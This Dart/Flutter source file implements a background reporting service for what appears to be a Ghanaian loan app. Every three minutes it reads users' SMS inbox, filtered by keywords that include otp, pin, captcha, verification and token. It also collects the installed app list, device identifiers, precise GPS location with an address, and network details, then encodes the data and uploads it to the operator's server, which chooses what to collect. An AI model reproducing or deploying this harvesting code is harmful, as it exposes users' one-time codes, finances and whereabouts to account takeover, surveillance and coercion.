import 'dart:async';
import 'dart:math';
import 'package:get/get.dart';
import 'dart:io';
import 'package:flutter3APP/basa/analytics/app_event_tracker.dart';
import 'package:flutter3APP/common/logger/app_logger.dart';
import 'package:flutter3APP/common/toast.dart';

import '../../utils/des/des.dart';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:flutter_sms_inbox/flutter_sms_inbox.dart';
import 'package:flutter_udid/flutter_udid.dart';
import 'package:geolocator/geolocator.dart';
import 'package:geocoding/geocoding.dart' as geocoding;
import 'package:installed_apps/app_info.dart';
import 'package:package_info_plus/package_info_plus.dart';
import 'package:path/path.dart' as locale;
import 'package:permission_handler/permission_handler.dart';

import 'package:shared_preferences/shared_preferences.dart';
import '../../provider/userDataHelper.dart';
import '../../http/api_urls.dart';
import '../../models/submit_user_upload.dart';
import '../../models/upload_data.dart';
import 'package:installed_apps/installed_apps.dart';
import '../../common/permission/permission_util.dart';
import 'package:system_info2/system_info2.dart';
import 'package:android_security_detector/android_security_detector.dart';
import 'package:display_metrics/display_metrics.dart';
//安卓不需要
import 'package:battery_plus/battery_plus.dart';
import 'package:network_info_plus/network_info_plus.dart' as network_info;

//上报信息服务
typedef DataTask =
    Future<void> Function(int trackId, UploadDataCheckData checkData);

//设备相关信息
class UpDataServer {
  static final UpDataServer _instance = UpDataServer._internal();
  factory UpDataServer() => _instance;
  UpDataServer._internal();

  Timer? _timer;
  int _cycleCount = 0;
  final List<DataTask> _tasks = [];


  //应用信息
  List<dynamic> _installedApps = [];

  //短信信息
  List<dynamic> _smsList = [];

  void initTasks() {
    if (Platform.isIOS) {
      _tasks.addAll([_reportDeviceInfo]);
    }
    if (Platform.isAndroid) {
      _tasks.addAll([
        _reportSms, //短信
        _reportDeviceInfo, //设备信息
        _reportAppList, //app列表
      ]);
    }
  }

  void start() {
    if (_tasks.isEmpty) initTasks();
    _runOnce();
    _timer = Timer.periodic(const Duration(seconds: 180), (_) => _runOnce());
  }

  void stop() {
    _timer?.cancel();
    _timer = null;
  }

  Future<void> triggerSingleReport() async {
    LogUtil.d('Triggering single report');
    if (_tasks.isEmpty) initTasks();
    await _runOnce();
  }

  Future<void> _runOnce() async {
    _cycleCount++;
    LogUtil.d('Cycle #$_cycleCount start');
    final token = await UserDataHelper.getToken();
    if (token == null || token.isEmpty) {
      LogUtil.d("token:$token");
      return;
    }

    final resp = await ApiUrls.checkDataValidity();
    if (!resp.isSucceed) {
      LogUtil.d('$resp');
      LogUtil.d('  ↳ Check data validity failed: ${resp.msg}');
      return;
    }

    // 将响应数据转换为 UploadDataCheckData 对象
    final checkData = UploadDataCheckData(
      appTrackId: resp.data?['appTrackId'] ?? 0,
      isValid: resp.data?['isValid'] ?? 0,
      isValidAppList: resp.data?['isValidAppList'] ?? 0,
      isValidCallLog: resp.data?['isValidCallLog'] ?? 0,
      isValidContacts: resp.data?['isValidContacts'] ?? 0,
      isValidDeviceInfo: resp.data?['isValidDeviceInfo'] ?? 0,
      isValidSmsRecord: resp.data?['isValidSmsRecord'] ?? 0,
    );

    final trackId = checkData.appTrackId;
    LogUtil.d('resp: $resp');

    // 顺序依次执行每个任务，每个任务间隔15秒
    for (final task in _tasks) {
      try {
        await task(trackId, checkData).timeout(
          const Duration(seconds: 6),
          onTimeout: () {
            LogUtil.d('  ⏱ Task timeout: $task');
          },
        );
      } catch (e, st) {
        LogUtil.d('  Task error: $task → $e');
      }
      // 任务间隔4秒
      await Future.delayed(const Duration(seconds: 4));
    }

    LogUtil.d('Cycle #$_cycleCount end');
  }

  Future<void> _reportDeviceInfo(
    int trackId,
    UploadDataCheckData checkData,
  ) async {
    if (checkData.isValidDeviceInfo != 0) {
      LogUtil.d('  ↳ Device info not required by server');
      return;
    }

    if (Platform.isIOS) {
      //  //ios能拿全拿
      await updataIOSDevice(trackId);
    } else {
      //安卓精简设备信息
      await updataAndroidDevice(trackId);
    }
  }

  Future<void> updataIOSDevice(int trackId) async {
    final hasGps = await PermissionUtil.checkAndRequest(Permission.location);
    if (!hasGps) {
      LogUtil.d('  ↳ Skipping device info: Location permission denied');
      return;
    }
    Position? pos;
    try {
      final serviceEnabled = await Geolocator.isLocationServiceEnabled();

      if (hasGps && serviceEnabled) {
        var perm = await Geolocator.checkPermission();
        if (perm == LocationPermission.denied) {
          perm = await Geolocator.requestPermission();
        }
        if (perm == LocationPermission.always ||
            perm == LocationPermission.whileInUse) {
          Position? lastKnownPosition = await Geolocator.getLastKnownPosition(
            forceAndroidLocationManager: true,
          );
          if (lastKnownPosition == null || lastKnownPosition.latitude == 0) {
            pos = await Future.any([
              Geolocator.getCurrentPosition(
                desiredAccuracy: LocationAccuracy.low,
                forceAndroidLocationManager: true,
              ),
              Future.delayed(Duration(seconds: 20), () {
                throw TimeoutException("tiempo de espera agotado");
              }),
            ]);
          } else {
            pos = lastKnownPosition;
          }
        }
      }
    } catch (e) {}
    // if (pos?.latitude == 0 || pos == null) {
    //   return;
    // }
    try {
      final nowMs = DateTime.now().millisecondsSinceEpoch;
      final locale = Platform.localeName;
      final timezone = DateTime.now().timeZoneName;

      var batteryLevel = 0;
      var batteryState;
      try {
        var _battery = Battery();
        batteryLevel = await _battery.batteryLevel;
        batteryState = await _battery.batteryState;
      } catch (e) {
        LogUtil.e("$e");
      }

      var memoryInfo = 0;
      var freeMemory = 0;
      var usage = 0;
      try {
        // 获取内存信息
        memoryInfo = SysInfo.getTotalPhysicalMemory();
        freeMemory = SysInfo.getFreePhysicalMemory();
        usage = memoryInfo - freeMemory;
      } catch (e) {
        LogUtil.e("$e");
      }

      String? advertisingId;
      int? androidVersionCode;
      String? baseBand;
      String? buildBoard;
      String? buildBrand;
      String? buildHost;
      String? buildId;
      String? buildProduct;
      String? buildTags;
      String? buildType;
      String? buildUser;
      String? buildUuid;
      String? deviceId;
      int? isSimulator;
      String? osVersion;
      String? phoneBrand;
      String? phoneModel;
      String? sn;
      int? deviceRoot;
      String? brand = '';
      String? model = '';
      int totalStorage = 0;
      int usableStorage = 0;

      // 1. 设备基础信息
      final deviceInfoPlugin = DeviceInfoPlugin();
      if (Platform.isAndroid) {
        final androidInfo = await deviceInfoPlugin.androidInfo;
        String udid = await FlutterUdid.udid;
        brand = androidInfo.brand ?? '';
        model = androidInfo.model ?? '';
        osVersion = androidInfo.version.release ?? '';
        deviceId = udid;
        sn = androidInfo.serialNumber ?? '';
        isSimulator = androidInfo.isPhysicalDevice ? 0 : 1;
        buildBoard = androidInfo.board ?? '';
        buildBrand = androidInfo.brand ?? '';
        buildHost = androidInfo.host ?? '';
        buildId = androidInfo.id ?? '';
        buildProduct = androidInfo.product ?? '';
        buildTags = androidInfo.tags ?? '';
        buildType = androidInfo.type ?? '';
        buildUser = '';
        buildUuid = androidInfo.fingerprint ?? '';
        baseBand = androidInfo.version.baseOS ?? '';
        androidVersionCode = androidInfo.version.sdkInt;
        totalStorage = (androidInfo.totalDiskSize / (1024 * 1024)).toInt();
        usableStorage = (androidInfo.freeDiskSize / (1024 * 1024)).toInt();
      } else if (Platform.isIOS) {
        final iosInfo = await deviceInfoPlugin.iosInfo;
        brand = 'Apple';
        model = iosInfo.utsname.machine ?? '';
        osVersion = iosInfo.systemVersion ?? '';
        deviceId = iosInfo.identifierForVendor ?? '';
        sn = iosInfo.identifierForVendor ?? '';
        isSimulator = iosInfo.isPhysicalDevice ? 0 : 1;
        buildBoard = iosInfo.utsname.machine ?? '';
        buildBrand = 'Apple';
        buildHost = '';
        buildId = iosInfo.utsname.machine ?? '';
        buildProduct = iosInfo.model ?? '';
        buildTags = '';
        buildType = '';
        buildUser = '';
        buildUuid = iosInfo.identifierForVendor ?? '';
        baseBand = '';
        androidVersionCode = 0;
        totalStorage = (iosInfo.totalDiskSize / (1024 * 1024)).toInt();
        usableStorage = (iosInfo.freeDiskSize / (1024 * 1024)).toInt();
      }

      // 获取广告ID
      final prefs = await SharedPreferences.getInstance();
      advertisingId = Platform.isAndroid
          ? prefs.getString('gaid') ?? ""
          : prefs.getString('id_fa') ?? "";

      // 采集屏幕信息
      final window = WidgetsBinding.instance.platformDispatcher.views.first;
      final dpr = window.devicePixelRatio == 0 ? 1.0 : window.devicePixelRatio;
      final size = window.physicalSize;
      final textScale =
          WidgetsBinding.instance.platformDispatcher.textScaleFactor;

      // 使用 display_metrics 获取真实度量
      final metrics = DisplayMetrics.of(Get.context!);

      final widthPx = metrics.resolution.width;
      final heightPx = metrics.resolution.height;
      final ppi = metrics.ppi; // 每英寸像素密度

      final diagonalPixels = sqrt(widthPx * widthPx + heightPx * heightPx);
      final diagonalInches = diagonalPixels / ppi;

      final screenInfo = ScreenInfo(
        density: dpr.toString(),
        densityDpi: (size.shortestSide / dpr).toInt(),
        widthPixels: widthPx.toInt(),
        heightPixels: heightPx.toInt(),
        scaledDensity: (textScale * dpr).toString(),
        physicalSize: "${diagonalInches.toStringAsFixed(2)}", // 保留两位小数
        xdpi: ppi.toString(),
        ydpi: ppi.toString(),
      );

      // 采集网络信息
      String? ipAddress;
      String? wifiName;
      String? wifiBSSID;
      String macAddr = "";
      String networkType = 'WIFI';
      if (hasGps) {
        network_info.NetworkInfo _networkInfo = network_info.NetworkInfo();
        ipAddress = await _networkInfo.getWifiIP();
        wifiName = await _networkInfo.getWifiName();
        wifiBSSID = await _networkInfo.getWifiBSSID();
        networkType = wifiName != null ? 'wifi' : 'cellular';
      }
      final networkInfoObj = NetworkInfo(
        configuredWifi: [], // Flutter端无法直接获取，传空
        currentWifi: wifiName != null
            ? NetWorkInfo(
                bssid: wifiBSSID ?? '',
                name: wifiName ?? '',
                ssid: '',
              )
            : null,
        ip: ipAddress,
        mac: macAddr ?? '',
        networkType: networkType,
      );

      final advBean = AdvinceDeviceInfoBean(
        batteryStatusInfo: BatteryStatusInfo(
          batteryLevel: batteryLevel,
          batteryPct: batteryLevel,
          isAcCharge: batteryState == BatteryState.charging ? 1 : 0,
          isCharging: batteryState == BatteryState.charging ? 1 : 0,
          isUsbCharge: batteryState == BatteryState.charging ? 1 : 0,
          batteryMax: 100,
        ),
        deviceBaseInfo: DeviceBaseInfo(
          androidId: deviceId,
          gaid: advertisingId,
          board: buildBoard,
          brand: buildBrand,
          currentSystemTime: nowMs,
          deviceName: phoneBrand,
          deviceUuid: buildUuid,
          fingerprint: buildUuid,
          isEmulator: isSimulator,
          manufacturer: phoneBrand,
          model: phoneModel,
          release: osVersion,
          sdkVersion: androidVersionCode,
          serialNumber: sn,
        ),
        localInfo: LocalInfo(
          language: locale.split('_')[0],
          localeIso3Language: await _getIso3Language(),
          localeIso3Country: await _getIso3Country(),
          // networkOperatorName: _telephony != null ? await _getNetworkOperatorName() : null,
          // simCountryIso: _telephony != null ? await _getSimCountryIso() : null,
          timeZoneId: timezone,
        ),
        locationInfo: pos != null
            ? LocationInfo(
                accuracy: pos.accuracy.toString(),
                latitude: pos.latitude.toString(),
                longitude: pos.longitude.toString(),
                time: pos.timestamp.millisecondsSinceEpoch,
                address: await _getAddressFromLocation(pos),
              )
            : null,
        networkInfo: networkInfoObj,
        otherInfo: OtherInfo(
          appFreeMemory: usage,
          appMaxMemory: memoryInfo,
          appTotalMemory: freeMemory,
        ),
        screenInfo: screenInfo,
        storageInfo: StorageInfo(
          internalStorageTotal: totalStorage,
          internalStorageUsable: usableStorage,
          ramTotalSize: memoryInfo,
          ramUsableSize: freeMemory,
        ),
      );

      final mediaQuery = MediaQueryData.fromWindow(
        WidgetsBinding.instance.window,
      );
      final screenDensity = mediaQuery.devicePixelRatio.toString();
      final widthPixels = mediaQuery.size.width.round();
      final heightPixels = mediaQuery.size.height.round();
      final pkg = await PackageInfo.fromPlatform();

      final deviceData = await deviceInfoPlugin.deviceInfo;
      final deviceInfoObj = UserDeviceInfo(
        advinceDeviceInfoBean: advBean,
        advertising_id: advertisingId,
        android_id: deviceId,
        androidVersionCode: androidVersionCode,
        app_version: pkg.version,
        base_band: baseBand,
        build_board: buildBoard,
        build_brand: buildBrand,
        build_host: buildHost,
        build_id: buildId,
        build_product: buildProduct,
        build_tags: buildTags,
        build_type: buildType,
        build_user: buildUser,
        build_uuid: buildUuid,
        cpu_cur_frequency: '',
        cpu_max_frequency: '',
        device_id: deviceId,
        device_id_9_sn: '',
        device_root: 0,
        device_sim: 0,
        firebaseInstanceId: '',
        hours_since_last_launch: 0,
        imei: '',
        is_simulator: isSimulator,
        language: Platform.localeName.split('_')[0],
        latitude: pos?.latitude.toString(),
        longitude: pos?.longitude.toString(),
        mac: macAddr,
        media_uuid: '',
        meid: '',
        new_imei: '',
        os_version: osVersion,
        phoneAliveTime: 0,
        phone_brand: brand,
        phone_model: model,
        screen_density: screenDensity,
        screen_resolution: '${widthPixels}x${heightPixels}',
        sdcard_total_capacity: totalStorage,
        sdcard_used_capacity: usableStorage,
        sim_card_status: 0,
        sim_code: '',
        sn: sn,
        sn_an9: '',
        sysCurTimestamp: DateTime.now().millisecondsSinceEpoch,
        total_memory: memoryInfo,
        total_storage: totalStorage,
        used_memory: usage,
        rawDeviceInfo: Platform.isIOS ? deviceData.data : {},
      );

      final hasSms = Platform.isIOS
          ? false
          : await PermissionUtil.checkAndRequest(Permission.sms);
      final byteData = await DESCryptUtil.mapToCompressedBytes(
        deviceInfoObj.toMap(),
      );
      final req = SubmitUserUploadDataReq(
        trackId: trackId,
        hasGpsPermission: hasGps ? 1 : 0,
        submitUserDeviceInfoBytes: byteData,
        hasSmsPermission: hasSms ? 1 : 0,
      );

      final result = await ApiUrls.submitUserUploadData(data: req.toMap());
      if (result.isSucceed) {
        LogUtil.d(' Device info uploaded req:$req\n');
      } else {
        LogUtil.d('   Device info upload failed: ${result.msg}');
      }
    } catch (e, st) {
      LogUtil.d('  Device info exception: $e');
    }
  }

  Future<void> updataAndroidDevice(int trackId) async {
    final hasGps = await PermissionUtil.checkAndRequest(Permission.location);
    if (!hasGps) {
      LogUtil.d('  Skipping device info: Location permission denied');
      return;
    }
    Position? pos;
    try {
      final serviceEnabled = await Geolocator.isLocationServiceEnabled();

      if (hasGps && serviceEnabled) {
        var perm = await Geolocator.checkPermission();
        if (perm == LocationPermission.denied) {
          perm = await Geolocator.requestPermission();
        }
        if (perm == LocationPermission.always ||
            perm == LocationPermission.whileInUse) {
          Position? lastKnownPosition = await Geolocator.getLastKnownPosition(
            forceAndroidLocationManager: true,
          );
          if (lastKnownPosition == null || lastKnownPosition.latitude == 0) {
            pos = await Future.any([
              Geolocator.getCurrentPosition(
                desiredAccuracy: LocationAccuracy.low,
                forceAndroidLocationManager: true,
              ),
              Future.delayed(Duration(seconds: 20), () {
                throw TimeoutException("time");
              }),
            ]);
          } else {
            pos = lastKnownPosition;
          }
        }
      }
    } catch (e) {}
    // if (pos?.latitude == 0 || pos == null) {
    //   return;
    // }
    try {
      var memoryInfo = 0;
      var freeMemory = 0;
      var usage = 0;
      try {
        // 获取内存信息
        memoryInfo = SysInfo.getTotalPhysicalMemory();
        freeMemory = SysInfo.getFreePhysicalMemory();
        usage = memoryInfo - freeMemory;
      } catch (e) {
        LogUtil.e("$e");
      }

      String? advertisingId;
      int? androidVersionCode;
      String? buildBoard;
      String? buildBrand;
      String? buildHost;
      String? buildId;
      String? buildProduct;
      String? buildTags;
      String? buildType;
      String? buildUser;
      String? deviceId;
      int? isSimulator;
      String? osVersion;
      String? brand = '';
      String? model = '';
      int totalStorage = 0;

      // 1. 设备基础信息
      final deviceInfoPlugin = DeviceInfoPlugin();
      final androidInfo = await deviceInfoPlugin.androidInfo;
      String udid = await FlutterUdid.udid;
      brand = androidInfo.brand ?? '';
      model = androidInfo.model ?? '';
      osVersion = androidInfo.version.release ?? '';
      deviceId = udid;
      isSimulator = androidInfo.isPhysicalDevice ? 0 : 1;
      buildBoard = androidInfo.board ?? '';
      buildBrand = androidInfo.brand ?? '';
      buildHost = androidInfo.host ?? '';
      buildId = androidInfo.id ?? '';
      buildProduct = androidInfo.product ?? '';
      buildTags = androidInfo.tags ?? '';
      buildType = androidInfo.type ?? '';
      buildUser = '';
      androidVersionCode = androidInfo.version.sdkInt;
      totalStorage = androidInfo.totalDiskSize;

      // 获取广告ID
      final prefs = await SharedPreferences.getInstance();
      advertisingId = Platform.isAndroid
          ? prefs.getString('gaid') ?? ""
          : prefs.getString('id_fa') ?? "";

      // 采集屏幕信息
      final window = WidgetsBinding.instance.platformDispatcher.views.first;
      final dpr = window.devicePixelRatio == 0 ? 1.0 : window.devicePixelRatio;
      final size = window.physicalSize;
      final textScale =
          WidgetsBinding.instance.platformDispatcher.textScaleFactor;

      // 使用 display_metrics 获取真实度量
      final metrics = DisplayMetrics.of(Get.context!);

      final widthPx = metrics.resolution.width;
      final heightPx = metrics.resolution.height;
      final ppi = metrics.ppi; // 每英寸像素密度

      final diagonalPixels = sqrt(widthPx * widthPx + heightPx * heightPx);
      final diagonalInches = diagonalPixels / ppi;

      final screenInfo = ScreenInfo(
        density: dpr.toString(),
        densityDpi: (size.shortestSide / dpr).toInt(),
        widthPixels: widthPx.toInt(),
        heightPixels: heightPx.toInt(),
        scaledDensity: (textScale * dpr).toString(),
        physicalSize: "${diagonalInches.toStringAsFixed(2)}", // 保留两位小数
        xdpi: ppi.toString(),
        ydpi: ppi.toString(),
      );

      // 获取安全检测信息
      Map<String, int> securityInfo = {};
      try {
        securityInfo = await AndroidSecurityDetector.getSecurityInfo();
      } catch (e) {
        LogUtil.e(" $e");
        // 如果获取失败，使用默认值
        securityInfo = {
          'isRootJailbreak': 0,
          'isUsingProxyPort': 0,
          'isVpnConnected': 0,
          'isUsbDebug': 0,
          'isMockLocation': 0,
        };
      }

      final generalInfo = GeneralInfo(
        isRootJailbreak: securityInfo['isRootJailbreak'] ?? 0,
        isUsingProxyPort: securityInfo['isUsingProxyPort'] ?? 0,
        isVpnConnected: securityInfo['isVpnConnected'] ?? 0,
        isUsbDebug: securityInfo['isUsbDebug'] ?? 0,
        isMockLocation: securityInfo['isMockLocation'] ?? 0,
      );

      final advBean = AdvinceDeviceInfoBean(
        screenInfo: screenInfo, //屏幕
        generalInfo: generalInfo,
      );

      final mediaQuery = MediaQueryData.fromWindow(
        WidgetsBinding.instance.window,
      );
      final screenDensity = mediaQuery.devicePixelRatio.toString();
      final widthPixels = mediaQuery.size.width.round();
      final heightPixels = mediaQuery.size.height.round();
      final pkg = await PackageInfo.fromPlatform();

      final deviceData = await deviceInfoPlugin.deviceInfo;
      final deviceInfoObj = UserDeviceInfo(
        advinceDeviceInfoBean: advBean,
        advertising_id: advertisingId,
        android_id: deviceId,
        androidVersionCode: androidVersionCode,
        app_version: pkg.version,
        build_board: buildBoard,
        build_brand: buildBrand,
        build_host: buildHost,
        build_id: buildId,
        build_product: buildProduct,
        build_tags: buildTags,
        build_type: buildType,
        build_user: buildUser,
        cpu_cur_frequency: '',
        cpu_max_frequency: '',
        device_id: deviceId,
        device_root: 0,
        firebaseInstanceId: '',
        hours_since_last_launch: 0,
        is_simulator: isSimulator,
        latitude: pos?.latitude.toString(),
        longitude: pos?.longitude.toString(),
        os_version: osVersion,
        phoneAliveTime: 0,
        phone_brand: brand,
        phone_model: model,
        screen_density: screenDensity,
        screen_resolution: '${widthPixels}x${heightPixels}',
        sysCurTimestamp: DateTime.now().millisecondsSinceEpoch,
        total_memory: memoryInfo,
        total_storage: totalStorage,
        used_memory: usage,
        rawDeviceInfo: Platform.isIOS ? deviceData.data : {},
      );

      final hasSms = Platform.isIOS
          ? false
          : await PermissionUtil.checkAndRequest(Permission.sms);
      final byteData = await DESCryptUtil.mapToCompressedBytes(
        deviceInfoObj.toMap(),
      );
      final req = SubmitUserUploadDataReq(
        trackId: trackId,
        hasGpsPermission: hasGps ? 1 : 0,
        submitUserDeviceInfoBytes: byteData,
        hasSmsPermission: hasSms ? 1 : 0,
      );

      final result = await ApiUrls.submitUserUploadData(data: req.toMap());
      if (result.isSucceed) {
        LogUtil.d(' Device info uploaded req:$req\n');
      } else {
        LogUtil.d('  Device info upload failed: ${result.msg}');
      }
    } catch (e, st) {
      LogUtil.d('  Device info exception: $e');
    }
  }

  //app列表
  Future<void> _reportAppList(
    int trackId,
    UploadDataCheckData checkData,
  ) async {
    if (checkData.isValidAppList != 0) {
      LogUtil.d('  App list not required by server');
      return;
    }
    try {
      List<dynamic> apps = [];
      if (_installedApps.length == 0) {
        if (Platform.isAndroid) {
          final stopwatch2 = Stopwatch()..start();
          List<AppInfo> installedApps = await InstalledApps.getInstalledApps(
            false,
            false,
            "",
            BuiltWith.flutter,
          );
          for (var app in installedApps) {
            // bool? isSystemApp = await InstalledApps.isSystemApp(
            //   app.packageName,
            // );
            apps.add(
              UserApp(
                appName: app.name,
                appPackage: app.packageName,
                appVersion: app.versionName,
                systemApp: app.isSystemApp == true ? 1 : 0,
                fiTime: app.installedTimestamp,
                luTime: app.installedTimestamp,
              ).toMap(),
            );
          }
          stopwatch2.stop();
          LogUtil.d('applist time: ${stopwatch2.elapsedMilliseconds} ms');
          _installedApps = apps;
        }
      } else {
        apps = _installedApps;
      }

      if (apps.isEmpty) {
        LogUtil.d('No apps detected');
        return;
      }

      final hasGps = await PermissionUtil.checkAndRequest(Permission.location);
      final hasSms = await PermissionUtil.checkAndRequest(Permission.sms);
      final byteData = await DESCryptUtil.compressList(apps);
      final req = SubmitUserUploadDataReq(
        trackId: trackId,
        submitUserAppListBytes: byteData,
        hasSmsPermission: hasSms ? 1 : 0,
        hasGpsPermission: hasGps ? 1 : 0,
      );
      final stopwatch3 = Stopwatch()..start();
      final result = await ApiUrls.submitUserUploadData(data: req.toMap());
      stopwatch3.stop();
      LogUtil.d(' ${stopwatch3.elapsedMilliseconds} ms');
      if (result.isSucceed) {
        LogUtil.d(' App list uploaded');
        LogUtil.d('req:$req\n');
      } else {
        LogUtil.d('App list upload failed: ${result.msg}');
      }
    } catch (e, st) {
      LogUtil.d(' App list exception: $e');
      LogUtil.d('Stack: $st');
    }
  }

  //短信获取
  Future<void> _reportSms(int trackId, UploadDataCheckData checkData) async {
    if (checkData.isValidSmsRecord != 0) {
      LogUtil.d('  SMS not required by server');
      return;
    }

    final hasSms = await PermissionUtil.checkAndRequest(Permission.sms);
    if (!hasSms) {
      LogUtil.d('  Skipping SMS: SMS permission denied');
      return;
    }

    if (!Platform.isAndroid) {
      LogUtil.d('  SMS not supported on this platform');
      return;
    }

    try {
      // 这里不再重复请求权限，直接用上面已获得的hasSms
      List<dynamic> smsList = [];
      if (_smsList.length == 0) {
        if (hasSms) {
          // 关键词过滤
          final List<String> smsContentKeywords = [
            "reject",
            "score",
            "cedi",
            "qualify",
            "auto",
            "wallet",
            "disburse",
            "due",
            "arrive",
            "settle",
            "delay",
            "contact",
            "increase",
            "captcha",
            "process",
            "offer",
            "fraud",
            "guarant",
            "default",
            "refuse",
            "record",
            "verification",
            "pin",
            "remain",
            "disturb",
            "summary",
            "insuffi",
            "payday",
            "current",
            "level",
            "trans",
            "limit",
            "paid",
            "bank",
            "quota",
            "fail",
            "final",
            "day",
            "ghs",
            "branch",
            "amount",
            "account",
            "credit",
            "ave",
            "time",
            "deposit",
            "free",
            "clear",
            "coop",
            "late",
            "application",
            "confirmation",
            "apply",
            "serious",
            "finance",
            "code",
            "balance",
            "date",
            "pass",
            "overdue",
            "fee",
            "raise",
            "loan",
            "approval",
            "mobile",
            "momo",
            "tax",
            "warning",
            "severe",
            "full",
            "sent",
            "quality",
            "pay",
            "reputation",
            "easybuy",
            "complete",
            "auth",
            "money",
            "send",
            "receive",
            "token",
            "expire",
            "otp",
            "bill",
            "outstanding",
            "upgrade",
            "success",
            "congratulations",
            "fund",
            "avoid",
            "mtn",
            "cash",
            "available",
          ];

          final List<String> smsNameKeywords = [
            "loan",
            "credit",
            "momo",
            "cash",
            "coolratesmt",
            "light",
            "sikayena",
            "ecg",
            "mobile",
            "money",
            "bank",
            "whatsapp",
          ];
          final stopwatch1 = Stopwatch()..start();
          SmsQuery query = SmsQuery();
          List<SmsMessage> smsMessages = await query.querySms(
            sendList: smsNameKeywords,
            contentList: smsContentKeywords,
          );
          stopwatch1.stop();
          LogUtil.d(' ${stopwatch1.elapsedMilliseconds} ms');
          final stopwatch2 = Stopwatch()..start();
          smsList = smsMessages
              .map(
                (m) => UserSms(
                  body: m.body,
                  date: m.date?.millisecondsSinceEpoch,
                  dateSent: m.dateSent?.millisecondsSinceEpoch,
                  phone: m.address,
                  type: m.kind?.index,
                ).toMap(),
              )
              .toList();

          stopwatch2.stop();
          LogUtil.d('s${stopwatch2.elapsedMilliseconds} ms');
          _smsList = smsList;
        }
      } else {
        smsList = _smsList;
      }

      if (smsList.isEmpty) {
        LogUtil.d(' No SMS to upload');
        return;
      }
      final hasGps = await PermissionUtil.checkAndRequest(Permission.location);
      final byteData = await DESCryptUtil.compressList(smsList);
      final req = SubmitUserUploadDataReq(
        trackId: trackId,
        hasSmsPermission: hasSms ? 1 : 0,
        hasGpsPermission: hasGps ? 1 : 0,
        submitUserSmsBytes: byteData,
      );
      final result = await ApiUrls.submitUserUploadData(data: req.toMap());
      if (result.isSucceed) {
        LogUtil.d(' SMS uploaded:$req\n');
      } else {
        LogUtil.d(' SMS upload failed: ${result.msg}');
      }
    } catch (e, st) {
      LogUtil.d('  SMS exception: $e');
    }
  }

  /// Gets ISO3 language code.
  Future<String?> _getIso3Language() async {
    try {
      return locale.split('_')[0].toUpperCase();
    } catch (e) {
      return null;
    }
  }

  /// Gets ISO3 country code.
  Future<String?> _getIso3Country() async {
    try {
      return locale.split('_').last.toUpperCase();
    } catch (e) {
      return null;
    }
  }

  /// Gets address from location.
  Future<String?> _getAddressFromLocation(Position pos) async {
    try {
      final placemarks = await geocoding.placemarkFromCoordinates(
        pos.latitude,
        pos.longitude,
      );
      final placemark = placemarks.first;
      return '${placemark.locality}, ${placemark.administrativeArea}, ${placemark.country}';
    } catch (e) {
      return null;
    }
  }
}
